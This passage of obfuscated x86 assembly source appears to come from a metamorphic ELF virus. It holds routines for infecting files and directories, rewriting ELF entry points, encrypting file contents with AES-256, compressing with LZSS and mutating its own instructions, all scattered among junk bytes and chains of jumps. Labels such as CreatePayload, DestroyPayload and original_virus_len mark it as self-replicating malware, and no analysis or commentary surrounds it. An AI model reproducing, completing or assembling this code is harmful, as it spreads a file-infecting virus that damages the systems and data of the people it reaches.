..@ui6vDtTj8evz:
    movr        rdi, rdi
    mjmp        ..@9qfjcNJjEfCX
..@V7JMhla4qHQl:
    movr        rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    mjmp        ..@I4FXFbCbzN5F
db 0x4a, 0x43, 0xa9
..@I4FXFbCbzN5F:
    mjmp        ..@CuTspeYMFj8x
db 0xb4, 0xa0
..@CuTspeYMFj8x:
    mjmp        ..@e7rFJQDfVQxi
db 0x60, 0x6e, 0xe2
..@e7rFJQDfVQxi:
    mjmp        ..@H5Mljz6WHojT
..@s6dXcqpsH8r1:
    cmp         eax, 07fh
    mjmp        ..@22DK4yJv4wQe
..@ZaldDI5lG4Nk:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    mjmp        ..@b8ZbpDe1WHov
db 0xfd
..@b8ZbpDe1WHov:
    mjmp        ..@ITv9Y0mkODQ7
..@QqOfvlPBFLKn:
    push        rbx
    pop         rbx
    xor         rax, rax
    xor         rbx, rbx
    mjmp        ..@bImEJGV5BsdF
db 0x4b
..@bImEJGV5BsdF:
    mjmp        ..@J7XfIvmXbChC
..@vvxBEoPvNKrR:
%ifdef X86_64
    mov         edx, DWORD [rdi]
%endif
    mjmp        ..@w9gPbgK0ngH4
CreatePayload:
    mjmp        ..@j6fOx7soCuVG
..@cYnruQNt7bHH:
%ifdef X86_64
    test        al, al
    jz          ..@T2ONBall8Yc0
    mov         WORD [rdi], bx
    add         rdi, 2
    mjmp        ..@80xEYZEUX6W4
%endif
    mjmp        ..@ZyWMhCHsWEFg
db 0x95, 0x65
..@ZyWMhCHsWEFg:
    mjmp        ..@T2ONBall8Yc0
..@ITv9Y0mkODQ7:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    push        rbx
    mjmp        ..@FKAbcLZ0WssR
db 0xde, 0xa0
..@FKAbcLZ0WssR:
    mjmp        ..@FgQCdtQASAnf
..@j6BQooYV93FF:
    xchg        rsp, rsp
    push        rdx
    pop         rdx
    mjmp        ..@wYkeD0iKv2M4
db 0x3f
..@wYkeD0iKv2M4:
    mjmp        ..@3mdEmQtzzZp9
..@9AdCra8Ei8LD:
%ifndef ENABLE_DEBUGGING
    movr        rbx, rbx
%endif
    mjmp        ..@SbbfXX0T4NhU
db 0x15
..@SbbfXX0T4NhU:
    mjmp        ..@uXM2B8MZK7Ug
..@vhJ7lWBiZb2z:
    push        r2
    mjmp        ..@B6Tra0D0dSw0
..@v6sio4rqiiYg:
    xor         rax, rax
    ret
    mjmp        ..@Onp9j3DqO94V
db 0x4c, 0x40
..@Onp9j3DqO94V:
    mjmp        ..@bgBuJJa9k9r5
..@VXJwCweyM7yG:
    jl          ..@dUtYP82VRfdk
    mjmp        ..@XQDEAnZE9eeW
..@PXz6nPV48fwF:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    mjmp        ..@MctsltnELoyD
..@JX8IaCGqwfjx:
    ret
    mjmp        FileValidation
..@NcdyrZDjIjrE:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    mjmp        ..@3GJSD0s9SNvd
..@uCj26GLudvZM:
    push        rcx
    pop         rcx
    cmp         BYTE [r1], 0x39
    jg          ..@tTigU9uPJbPQ
    mjmp        ..@jU6qZqspL3ZS
db 0xc8
..@jU6qZqspL3ZS:
    mjmp        ..@wQZY5gYKUEl9
..@QcJOCFcNKzQG:
%ifdef X86_32
    and         edx, 0000c0ffh
    cmp         edx, 0c089h
%endif
    mjmp        ..@oNUflgz7Z8AO
db 0x26, 0x10
..@oNUflgz7Z8AO:
    mjmp        ..@OTdy6UVmZwCc
..@wIVR8kZ4xY8R:
    push        rsi
    mjmp        ..@ymamWfF7yz6J
db 0xe5
..@ymamWfF7yz6J:
    mjmp        ..@WfqM7mp32KTA
..@rbpZqkmtIJWx:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    mjmp        ..@4lkrHU39d4DR
db 0x95, 0x40
..@4lkrHU39d4DR:
    mjmp        ..@K66vsZnztCDG
db 0x6b
..@K66vsZnztCDG:
    mjmp        ..@FPUn82pid6B7
ConvertMoveZeroToXor:
    mjmp        ..@sEVRFpzAVamI
..@WO7M8lPQM9rP:
    shr         edx, 8
    mjmp        ..@klgqdX6qgofs
db 0xcb
..@klgqdX6qgofs:
    mjmp        ..@ko2BdavS6do0
db 0x21, 0x3b, 0xed
..@ko2BdavS6do0:
    mjmp        ..@Uz6V5Ecbajxh
..@TwIZpGTz6MxB:
%ifdef X86_64
    pop         rdi
%endif
    mjmp        ..@DXpdivYHqTKE
db 0xd3, 0xe0
..@DXpdivYHqTKE:
    mjmp        ..@lnIV3TY0jtKD
..@QThjoW5fpZ6s:
    add         ebx, 1
    movr        rcx, rcx
    mov         BYTE [rsi], bl
    mjmp        ..@us3AyZqBlRCh
..@AtClTw9Sv94V:
    push        rsi
    push        rcx
    movr        rdi, rsi
    mjmp        ..@ynWa8eAfILqF
..@fS9UTzcpHGYT:
    movr        r4, r3
    sub         r4, QWORD [r1+e_h.e_entry]
    push        rsi
    pop         rsi
    cmp         r4, 0x00
    mjmp        ..@rlNKsFxDRNxx
db 0x98
..@rlNKsFxDRNxx:
    mjmp        ..@EFYlr8JMFbKU
..@fu5lhWgtC6WE:
    ret
    mjmp        ..@1TBYNOANiZpl
db 0x66
..@1TBYNOANiZpl:
    mjmp        ..@7eCK6tThdVs8
db 0x65, 0xd4, 0x96
..@7eCK6tThdVs8:
    mjmp        DestroyPayload
..@Tcqv47H00Ft7:
    movv        rax, 0x20
    mjmp        ..@XQ1lbcJ4C7yE
..@Pnv7ItZBF9DV:
    jz          ..@VKNMwfXLQQQj
    mjmp        ..@UkgqxzHJPDwf
db 0x02
..@UkgqxzHJPDwf:
    mjmp        ..@9AAIozxkLBa6
..@n6PjvPxncpZn:
    movr        rcx, rcx
    movdqu      xmm1, oWORD [rsp+0x60]
    aesenc      xmm0, xmm1
    movr        rax, rax
    mjmp        ..@qlqOfSPiNEKF
..@FgQCdtQASAnf:
    pop         rbx
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    add         rdi, rax
    mjmp        ..@QqOfvlPBFLKn
..@ncAPupya8RyT:
    xor         rcx, rcx
    xchg        rdi, rdi
    xor         rdx, rdx
    mjmp        ..@KVndoL6j1Kq6
..@LlgZRR6ItOjA:
    push        rbx
    pop         rbx
    cmp         dx, 800fh
    movr        rbp, rbp
    jne         ..@Gz2Q9TpFbeAg
    mjmp        ..@tlVFovMSxYPZ
db 0xc4, 0xfb, 0xfd
..@tlVFovMSxYPZ:
    mjmp        ..@s8mu8LfTn01K
..@Dom3LWCqrXHj:
%ifdef X86_64
    cmp         edx, 00e88048h
    je          ..@EuaGjmwM9vTp
    xchg        rsp, rsp
    cmp         dx, 0548h
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@tdWqNFVlxhaA
db 0x96, 0x1d, 0x95
..@tdWqNFVlxhaA:
    mjmp        ..@QoMqCyCwwLaz
db 0xfb, 0x2b
..@QoMqCyCwwLaz:
    mjmp        ..@2VGNij8gPjqx
db 0x3e, 0x46
..@2VGNij8gPjqx:
    mjmp        ..@InspLkTgiA1T
..@WeWG8V4zKBtf:
    movv        rcx, 0x20
    mjmp        ..@Lso19POh54mz
db 0x13, 0x96, 0x30
..@Lso19POh54mz:
    mjmp        ..@FfGMi7plZcIV
db 0x3b, 0x01, 0x98
..@FfGMi7plZcIV:
    mjmp        ..@erwIcSk1lztD
..@zur4nP9v46UK:
    xchg        rax, rax
    mjmp        ..@MnyqvWAhC2o6
..@9FMgT5jbZVXB:
    xor         rax, rax
    xchg        rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    mjmp        ..@pS31SwL5krNl
..@3vrcryQWWAVZ:
    pop         rdi
    aesenc      xmm0, xmm1
    push        rdi
    pop         rdi
    mjmp        ..@7svLfo1mxZ79
db 0xfb, 0x93
..@7svLfo1mxZ79:
    mjmp        ..@n6PjvPxncpZn
..@4SUxIY65PI5T:
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    mov         QWORD [rsp+_AESE_OFF.length], r2
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    movr        rsi, rsp
    mjmp        ..@xQ0B3j4LvSbn
..@4Wf5tpAjTu2V:
%ifdef X86_32
    mov         BYTE [esi+ecx], 00h
%endif
    mjmp        ..@amIjRxcLvwl8
db 0x35, 0xef
..@amIjRxcLvwl8:
    mjmp        ..@bGAGhuJuL6fE
db 0xcd, 0xd6
..@bGAGhuJuL6fE:
    mjmp        ..@PDKo8lDHetx6
..@h5DtGaJ4hUPf:
    jl          ..@KGbcZAkVcc2M
    mjmp        ..@abD2RapBdAy0
db 0x6c, 0xa0
..@abD2RapBdAy0:
    mjmp        ..@21FdlWvhtMF3
db 0x96, 0x44
..@21FdlWvhtMF3:
    mjmp        ..@GQBnsP1qtjy4
..@YNxx0GWuGaLr:
    and         edx, 0ffffh
    mjmp        ..@0CKG7rTYnAuf
..@aIOFYrjLH1Bx:
    pop         r5
    mjmp        ..@kEHUKjuXs771
..@aew0yfQo8N67:
%ifdef X86_32
    movv        eax, SYS_MMAP2
    int         0x80
%endif
    mjmp        ..@DJyrSgMeuVoc
..@lSN7CAeyVhTg:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    mjmp        ..@nRChCKLjeOfl
db 0x4c, 0xcb, 0xcb
..@nRChCKLjeOfl:
    mjmp        ..@KGbcZAkVcc2M
..@H8uTnwxofw5j:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    mjmp        ..@oZgs6mazztm5
db 0x09, 0xf6
..@oZgs6mazztm5:
    mjmp        ..@ZFH7w3iehvNy
db 0xa1, 0x4a, 0xff
..@ZFH7w3iehvNy:
    mjmp        ..@mQwZ9cicluqN
..@jtQFC6LElulm:
    rep         nop
    call        MemMove
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    mjmp        ..@nGFQ6vQENnxN
..@EH1A0eexuZ91:
    sub         rsp, _MUTA_OFF_size
    mov         QWORD [rsp+_MUTA_OFF.start], r1
    mov         DWORD [rsp+_MUTA_OFF.size], r2d
    mov         QWORD [rsp+_MUTA_OFF.key], r3
    mov         DWORD [rsp+_MUTA_OFF.index], 0x00
    mjmp        ..@8NT25Nz9sx0t
..@zvEtWF7wnQmr:
%ifdef X86_64
    mov         bl, 41h
%endif
    mjmp        ..@XIPcDP4FU8ah
..@5YI8VQKtr0HY:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    mjmp        ..@WplCvuJpsogN
db 0x43, 0xc9, 0x2f
..@WplCvuJpsogN:
    mjmp        ..@lDSCB9LEhdLA
..@iBcl4GZm07A7:
    mov         eax, DWORD [rdi+1]
    mov         dx, WORD [rdi+5]
    mjmp        ..@u9v9NLTsJXNO
    mjmp        ..@UFQEpRpamrYj
db 0x1c, 0x24, 0x49
..@UFQEpRpamrYj:
    mjmp        ..@WO7M8lPQM9rP
..@bcUwEfxlJMVL:
%ifdef X86_32
    pop         rsi
%endif
    mjmp        ..@1LuSGTx8NeRu
db 0xa9
..@1LuSGTx8NeRu:
    mjmp        ..@AEWfiR4mgAWi
..@97c7r1JjWAXX:
    xor         rdx, rdx
    rep         nop
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    push        rdi
    mjmp        ..@LDnAuZ2tbAKM
..@XX5n0blqSyWQ:
    call        MemMove
    mjmp        ..@WdfA4oWkSoPf
..@NFip7d2f0mpu:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    mjmp        ..@50GTvXNU1j1w
..@8GiovvNAsYLr:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    push        rdx
    mjmp        ..@hK82nxGXKeyl
db 0xef
..@hK82nxGXKeyl:
    mjmp        ..@AweEopZu3Ggy
..@FPUn82pid6B7:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    mov         QWORD [rsp+_UPDATASIG_OFF.meta_ptr], r4
    GGLOBAL     _signature.start
    movr        rsi, r5
    mjmp        ..@Wn5Xwic79UaR
db 0xd7, 0x3e, 0x49
..@Wn5Xwic79UaR:
    mjmp        ..@jM2Ckw0ZXo6N
..@sQX9MJdPnBSV:
    push        rdx
    mjmp        ..@DCL39HCJUUAs
..@jJ2PEnpITutI:
    xor         dl, BYTE [rsp]
    mjmp        ..@swMBtY9z4v5u
db 0x62
..@swMBtY9z4v5u:
    mjmp        ..@49vyDdvrWpWg
IsNum:
    mjmp        ..@EdAQ71512Odt
..@hofGyxcCLRDx:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    movr        rsi, rdi
    add         rdi, rbx
    movr        rsi, rsi
    mjmp        ..@vvjWEbyVn7K6
..@dGExjX8VtIFw:
    xor         rax, rax
    mjmp        ..@3useCHNgYL7j
db 0xb2
..@3useCHNgYL7j:
    mjmp        ..@4nyIjzGNETIx
..@ZxLdDlotfvKp:
    movv        rcx, WINDOW_LENGTH
    mjmp        ..@CueMqoAKNPOz
..@Gx6XyY6lrSLb:
    mov         r3, [r1+e_h.e_phoff]
    lea         r4, [r1]
    add         r4, r3
    mjmp        ..@RB6qBDZrHq73
db 0x49, 0xcd
..@RB6qBDZrHq73:
    mjmp        ..@3dgW9ly77U44
..@LxaNH3VI6hIg:
    movv        rax, (-1)
    mjmp        ..@bYX38eaTbBrt
..@K6INJJgtbyqn:
    mov         r2, QWORD [r5+file.filesize]
    lea         r3, [rsp+_NBF_OFF.key]
    call        Aes256Encryption
    mov         r1, [rsp+_NBF_OFF.file]
    mjmp        ..@61pOItTd5Pe1
db 0x4a
..@61pOItTd5Pe1:
    mjmp        ..@FLl3I5gubKP4
DestroyPayload:
    mjmp        ..@t0k3OxN1rSnY
..@sSzH1rFrg8iV:
%ifdef X86_32
    movv        edi, 0xffffffff
    push        ebp
%endif
    mjmp        ..@EG8AkZIPWKPb
..@aSm4fDoraayd:
    pop         rdx
    mjmp        ..@P11PFFc4mIjt
db 0x9d, 0x34, 0x30
..@P11PFFc4mIjt:
    mjmp        ..@Hl6EDIkz4wNf
..@zXojX6kX6sCL:
    xchg        rax, rax
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jnz         ..@tEDwSusbxzbX
    mjmp        ..@R71LCwgw82fT
db 0x3f, 0xc7
..@R71LCwgw82fT:
    mjmp        ..@8GiovvNAsYLr
..@rIgByLZ7LLvX:
    xchg        rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    sub         al, 0x02
    movv        rdx, 1
    mjmp        ..@Gb259VSFOwSd
..@STOTEyAR97fS:
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    call_vsp    Strlen
    mjmp        ..@ZuLM8Nqolfkk
..@IURrE82SseHD:
    mjmp        ..@1IjmEUh4TouZ
    mjmp        ..@xUpKfzDnlvmx
..@Lo2g7r83zoRY:
%ifdef X86_64
    cmp         edx, 00e88348h
%endif
    mjmp        ..@TlYGRoIXqXmB
..@ieVhvfujbHV1:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jl          ..@vScslf2gzHHo
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    mjmp        ..@mK5XDdpvHJaA
..@SCZfjrREhtoa:
    test        eax, eax
    mjmp        ..@nFFEVm4xEZeG
db 0xa3, 0x13, 0xcb
..@nFFEVm4xEZeG:
    mjmp        ..@MLCfK2w1dDrk
..@pmW6hnBd7z16:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    mjmp        ..@OTEvWkXIsTPE
db 0x36, 0xd4, 0x23
..@OTEvWkXIsTPE:
    mjmp        ..@ZjjncQU6S3rT
db 0x4b
..@ZjjncQU6S3rT:
    mjmp        ..@iFZvXpeKb8QG
..@no9YMbW3bZKZ:
    pop         rdi
    mjmp        ..@JgmmOPQYuyXz
..@U2FtlG5biWdK:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    mjmp        ..@rvjq7cxKenrn
db 0xa6
..@rvjq7cxKenrn:
    mjmp        ..@pXLFmpACCvYx
db 0x2a, 0xed, 0x6e
..@pXLFmpACCvYx:
    mjmp        ..@Q1SLk5BZVAbE
..@nuZT3VcRZka0:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
%endif
    mjmp        ..@23fx1s6cx9EU
db 0x6e, 0x37, 0x9a
..@23fx1s6cx9EU:
    mjmp        ..@0TayowFa9csN
db 0x04, 0x00, 0xcc
..@0TayowFa9csN:
    mjmp        ..@eaxpxVBj8mys
..@BrsoC4WReR31:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    movr        rcx, rcx
    mjmp        ..@uu9pGbCzrioZ
db 0xe7
..@uu9pGbCzrioZ:
    mjmp        ..@H0S4DcimrtXf
..@UCCtD8j31FWh:
    push        rcx
    movr        rax, rax
    pop         rcx
    mjmp        ..@BoE3MEK8gCD2
..@avhCHc7X5eZS:
    xor         rdi, rdi
    xor         rdx, rdx
    push        rax
    mjmp        ..@jgOktkxPCM8F
db 0xf5, 0x13
..@jgOktkxPCM8F:
    mjmp        ..@Y01eWG6Dq65f
..@4t4ctNaSRpEF:
    jge         ..@amSjgXHWBguE
    mjmp        ..@zFgxTGbBlORX
db 0xc2, 0x3c
..@zFgxTGbBlORX:
    mjmp        ..@i1dPr4dgRXfn
..@9YPvqF9BGflY:
    xchg        rdx, rdx
    mjmp        ..@tUIRHWRd22Zl
..@DGZ4iKadnzmL:
    rep         nop
    mov         rcx, m7
    sub         rcx, m6
    mjmp        ..@kSNZD2n3QJA3
db 0x26, 0x0e, 0x4e
..@kSNZD2n3QJA3:
    mjmp        ..@v5JGpUfQ9kw7
..@WYw2KlTkkX0U:
    call        ConvertXorToMoveZero
    mjmp        ..@uOZ2G0ze9eph
..@Tn6mQ1J2a0RO:
    mjmp        ..@uAofuBz19Zg9
    mjmp        ..@1ULQBTZcCcjK
db 0x4f, 0xc7
..@1ULQBTZcCcjK:
    mjmp        ..@wxwWfm7MP6qM
..@673pNbPcOLae:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    mjmp        ..@4iUeA8es9yAB
db 0xc2, 0x4b
..@4iUeA8es9yAB:
    mjmp        ..@DADLTSYUt1qT
..@EtYB2boqerdj:
    movv        rbx, 0x1000
    sub         rbx, r3
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    mjmp        ..@lGe0CoudoIBb
db 0x37, 0xa8
..@lGe0CoudoIBb:
    mjmp        ..@mwqjcO209Agk
..@TSJz1kwmEd6M:
    mjmp        ..@8ujmAsyvzOB2
    mjmp        ..@2I2vpRxUSa1b
db 0xa2, 0x45, 0x46
..@2I2vpRxUSa1b:
    mjmp        ..@CEaxbXo0A5z9
..@rr7uLU0IelYU:
    xchg        rax, rax
    movr        rdi, rsp
    mjmp        ..@uzcAb4qi83tT
db 0x62
..@uzcAb4qi83tT:
    mjmp        ..@WeWG8V4zKBtf
..@xci9BJvsdxGr:
    mov         WORD [rdi], dx
    mov         DWORD [rdi+2], ecx
    or          dx, 100000000b
    mjmp        ..@i57BzyR18MyL
..@eaj15fdpvp0G:
    movdqu      xmm1, oWORD [rsp+0x40]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x50]
    mjmp        ..@kX1ny4vLzyNb
db 0xc5, 0x1b
..@kX1ny4vLzyNb:
    mjmp        ..@uDsoD2E5Ytb3
..@jYjZsUjIDCsG:
    ret
    mjmp        ..@jxQypQEcefs8
..@zUiABcMK9DWj:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    mjmp        ..@9C21s3UqNpj5
db 0xd1
..@9C21s3UqNpj5:
    mjmp        ..@WBGXtPdjGHwN
db 0x11
..@WBGXtPdjGHwN:
    mjmp        ..@h5DtGaJ4hUPf
..@9rMSLvjOCEMO:
%ifdef X86_64
    cmp         edx, 90905850h
    je          ..@p1TRtLd8XYZN
%endif
    mjmp        ..@ui6vDtTj8evz
..@hHLBNbU8XV87:
    mul         r3 
    mjmp        ..@wNd1w0kOIkBb
..@k4dst9y61ZMl:
%ifdef X86_64
    cmp         dl, 48h
    movr        rbp, rbp
    jne         ..@JG5RBZEsaCxl
    add         rcx, 1
%endif
    mjmp        ..@73pxvOfCoWp6
db 0xa6
..@73pxvOfCoWp6:
    mjmp        ..@Kwuze5SMjKgW
db 0xa1
..@Kwuze5SMjKgW:
    mjmp        ..@JG5RBZEsaCxl
..@6BxfUWTxQii0:
    ret
    mjmp        MapFile
..@hvM6SHnuxnu0:
    ret
    mjmp        ..@GA4UJaIuYLgx
db 0xcf, 0x69
..@GA4UJaIuYLgx:
    mjmp        ..@VaKmcttuXiDO
db 0xe0, 0xaf, 0x32
..@VaKmcttuXiDO:
    mjmp        ..@8yojEgHXMELJ
db 0x92
..@8yojEgHXMELJ:
..@qUT3dwQ8vjfr:
    push        r1
    movr        rsp, rsp
    push        r2
    push        r3
    sub         rsp, _KEYGEN_OFF_size
    mjmp        ..@NBVBp0Bv7F4q
db 0x38
..@NBVBp0Bv7F4q:
    mjmp        ..@ZFZC1fnSHUwQ
db 0xaa
..@ZFZC1fnSHUwQ:
    mjmp        ..@rQz2lFFBLqdx
..@vvn1HiB1VTWW:
    movr        rdx, rsi
    mjmp        ..@u3Xcupp1KDyn
..@3DvgLWjSQmAI:
    jl          ..@VS1Sy4nfkuW1
    je          ..@KCzPFXmmnbhm
    mjmp        ..@weW2Rev71fD9
db 0xb5, 0xad, 0x94
..@weW2Rev71fD9:
    mjmp        ..@EE5eFOi2o8CG
..@ljCnmLBDcYdw:
%ifdef X86_64
    movv        r8, 0xffffffffffffffff
%endif
    mjmp        ..@p1xQ9nk6Zu9D
..@0fm4zPMQct5G:
    push        rsi
    mjmp        ..@gKUMhDwu7Vdh
db 0xa5, 0x6c, 0xc8
..@gKUMhDwu7Vdh:
    mjmp        ..@KzLsRi936Nds
db 0xab, 0xec, 0x04
..@KzLsRi936Nds:
    mjmp        ..@JmMWIfB9pp33
..@KEQFrkLu6oPW:
    sub         rsp, _AESE_OFF_size+0x100
    and         rsp, 0xfffffffffffffff0
    push        rbx
    pop         rbx
    xchg        rcx, rcx
    mjmp        ..@etOzJszQOxP7
db 0x99, 0xfe
..@etOzJszQOxP7:
    mjmp        ..@4SUxIY65PI5T
..@a0kZOP9nOQdm:
    add         BYTE [rdi], 2
    mjmp        ..@dEuVbvl9vVhH
..@iz3utZBO46Lb:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    mjmp        ..@LAs6tqT4Kjnr
db 0xfc, 0x37, 0x2b
..@LAs6tqT4Kjnr:
    mjmp        ..@NZMa9hgsigSU
db 0x61
..@NZMa9hgsigSU:
    mjmp        ..@ZoTNQMQ6JR1B
..@uVUUroZqoYlr:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    mjmp        ..@o8pX4dyeR6EX
..@o7BNyn2WXSFE:
    movr        rsp, rsp
    add         r4, rax
    push        rcx
    pop         rcx
    mjmp        ..@IBhon3i96stg
db 0xf3
..@IBhon3i96stg:
    mjmp        ..@zUiABcMK9DWj
..@MMagtNsxqTxV:
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    mjmp        ..@bYX38eaTbBrt
    mjmp        ..@wIVR8kZ4xY8R
..@RgLGE671EuYI:
    movv        r2, 1b
    call        MapFile
    mjmp        ..@XUvyZ9T3gvQR
..@4UeV61A3psGA:
    movr        rcx, rcx
    mjmp        ..@xDSIoQq9ns0Q
..@ZTNXxnXeOqB4:
    movv        r2, 11b
    call        MapFile
    cmp         rax, 0
    movr        rsi, rsi
    jne         ..@GkOt1RV7VMVc
    mjmp        ..@Aw6rcf2Ofyiu
db 0x94, 0x15, 0xd1
..@Aw6rcf2Ofyiu:
    mjmp        ..@NFip7d2f0mpu
..@xxRiOeDPnWLL:
    xor         rdx, rdx
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_MUTA_OFF.random_BYTE], dl
    mjmp        ..@m76AVMqH8ruB
db 0xaf, 0xb7, 0xc0
..@m76AVMqH8ruB:
    mjmp        ..@hGdiIbUP3z0L
..@QJqEM7dLWRc6:
%ifdef X86_64
    mov         bx, dx
    shr         bx, 8
    push        rbx
    pop         rbx
%endif
    mjmp        ..@trKL3UWbKOlf
db 0x21, 0x6b
..@trKL3UWbKOlf:
    mjmp        ..@7QbSKXvWwGid
db 0xcd, 0xcb, 0x23
..@7QbSKXvWwGid:
    mjmp        ..@x3CDjJi9cZLx
..@KgOUcwcvDmAD:
%ifndef ENABLE_DEBUGGING
    jz          ..@nxG4UTDfN8cQ
    xchg        rdx, rdx
    movr        rax, rax
    mjmp        ..@3eMzvMToLeUr
%endif
    mjmp        ..@nxG4UTDfN8cQ
..@P09foq8kfMtr:
    je          ..@WO7M8lPQM9rP
    mjmp        ..@wQXdDazlAQ62
..@R9hfnn0zzauY:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         bx, WORD [rsi+e_h.e_shnum]
    mjmp        ..@7gZFmWPyHzY4
..@0FdhCmQYWHuS:
    mov         BYTE [rsi], 05h
    mjmp        ..@zojCL5zJLayX
..@nxG4UTDfN8cQ:
%ifndef ENABLE_DEBUGGING
    movv        r1, 0xf
%endif
    mjmp        ..@2NqD8yQtvfvN
..@8WgxpwYalSZV:
%ifdef X86_64
    or          bl, 101b
%endif
    mjmp        ..@Jy3c5oQlmpId
..@66F5lLgq2Wsd:
    pop         r1
    mjmp        ..@L7RsAfUyBxQ9
db 0x98
..@L7RsAfUyBxQ9:
    mjmp        ..@cIK2VnctTADZ
db 0xd6, 0xea, 0x1d
..@cIK2VnctTADZ:
    mjmp        ..@iQ2YWznnn8W0
..@RwhOuA57cRMm:
    mov         cl, dl
    or          cl, 1b
    shl         ecx, 16
    push        rdx
    pop         rdx
    mjmp        ..@XULOVkfSE1R8
db 0xb1, 0x35, 0x0b
..@XULOVkfSE1R8:
    mjmp        ..@YNxx0GWuGaLr
..@kfhCZA7UrPab:
    call        GetNewProgramVaddr
    mjmp        ..@TntbbD4PkSZj
db 0xf0
..@TntbbD4PkSZj:
    mjmp        ..@vlJUKKSVQvNy
..@EiUaHrhUDQlb:
    cmp         QWORD m7, 0x00
    mjmp        ..@rzkpjmM4KNdq
..@hy205IHLQKlQ:
%ifdef X86_32
    xor         eax, eax
    movv        ecx, original_virus_len+PADDING
    movv        edx, 11b
    movv        esi, 0x22
%endif
    mjmp        ..@sSzH1rFrg8iV
..@hGdiIbUP3z0L:
    movr        rsp, rsp
    mjmp        ..@2QJpwdAetnK9
ConvertDoubleJumpToJump:
    mjmp        ..@e7sXD4kede3G
..@oTxxNuHkFqex:
    pop         rdi
    jz          ..@a7X2S2pxZ8rl
    mjmp        ..@Mh4dGl7Dh2yH
db 0xdd, 0x1d, 0xd2
..@Mh4dGl7Dh2yH:
    mjmp        ..@DmRpd3Pf49Qw
..@9Ww5SU4Xx85f:
    mjmp        ..@xhLsdsvIN52N
    mjmp        ..@ooekPiANgLt2
db 0x92
..@ooekPiANgLt2:
    mjmp        ..@q33n7vJ6zgaJ
..@JW6z2FFZzY3L:
    xor         r1, r1
    mjmp        ..@FW0WTbzBcYbC
db 0xa9, 0x43
..@FW0WTbzBcYbC:
    mjmp        ..@43XcMPPade83
db 0xff, 0xad
..@43XcMPPade83:
    mjmp        ..@hh7rHleCJAOu
..@erwIcSk1lztD:
    push        rax
    pop         rax
    push        rsi
    pop         rsi
    mjmp        ..@zCf3wccdZmS5
db 0xf7, 0x43, 0xae
..@zCf3wccdZmS5:
    mjmp        ..@l345bb66GdKM
..@v69CTZzfXrzr:
    movr        r1, r5
    mjmp        ..@ht9wdsBYmny0
..@4N4RPyV0SNXp:
    call        WORDToDWORDASCII
    mov         r5, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    mov         DWORD [r5+_signature.meta_preview-_start+(r4*2)], eax
    add         r4, 2
    cmp         r4, 0x8
    mjmp        ..@Kt8SvcOsUtVA
db 0xc5, 0x66
..@Kt8SvcOsUtVA:
    mjmp        ..@VXJwCweyM7yG
..@DDEo0sjLZIP0:
%ifdef X86_64
    shl         ecx, 16
%endif
    mjmp        ..@Zc5wCy3tl14u
db 0x15, 0x6d
..@Zc5wCy3tl14u:
    mjmp        ..@3QzTNnlDPZGI
..@af8RCP8UA0JT:
%ifdef X86_32
    mov         dx, WORD [rdi]
%endif
    mjmp        ..@yQ7Kz4qQ3ESW
db 0x21, 0x46, 0xe1
..@yQ7Kz4qQ3ESW:
    mjmp        ..@jmARv9uA1bCG
..@xDSIoQq9ns0Q:
    xor         rbx, rbx
    add         rsi, 1
    mjmp        ..@wFYfQbfRfNca
db 0x45, 0xea
..@wFYfQbfRfNca:
    mjmp        ..@pIceAsp73FOr
..@CEaxbXo0A5z9:
    add         rbx, 1
    mjmp        ..@R9hfnn0zzauY
..@ctzEoSPuARuV:
    pop         rsi
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    movr        rsp, rsp
    mjmp        ..@lkqTshbphWhb
db 0xee, 0x9e, 0xf3
..@lkqTshbphWhb:
